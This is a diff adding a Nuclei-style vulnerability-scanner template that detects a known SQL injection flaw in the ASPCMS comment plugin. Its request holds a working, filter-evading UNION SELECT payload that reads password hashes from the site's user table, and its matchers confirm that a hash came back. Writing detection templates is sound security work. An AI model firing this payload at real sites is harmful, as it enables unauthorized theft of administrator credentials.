@@ -1,0 +1,30 @@
+id: aspcms-sql-injection-cnvd-2019-16252
+info:
+  name: ASPCMS SQL Injection (CNVD-2019-16252)
+  author: ProjectDiscoveryAI
+  severity: high
+  description: |
+    Detects SQL injection vulnerability in ASPCMS plug-in comment section as per CNVD-2019-16252.
+  reference:
+    - https://www.cnvd.org.cn/flaw/show/CNVD-2019-16252
+
+variables:
+  rand: "{{rand_int(-200000, -100000)}}"
+
+http:
+  - raw:
+      - |
+        GET /plug/comment/commentList.asp?id=-1%20unmasterion%20semasterlect%20top%201%20null,null,abs({{rand}}),Password,1,null,1%20%20frmasterom%20{prefix}user HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: regex
+        regex:
+          - "{{rand}} IP"
+      - type: regex
+        regex:
+          - "<div class=\"line2\">[0-9a-f]{16}</div>"
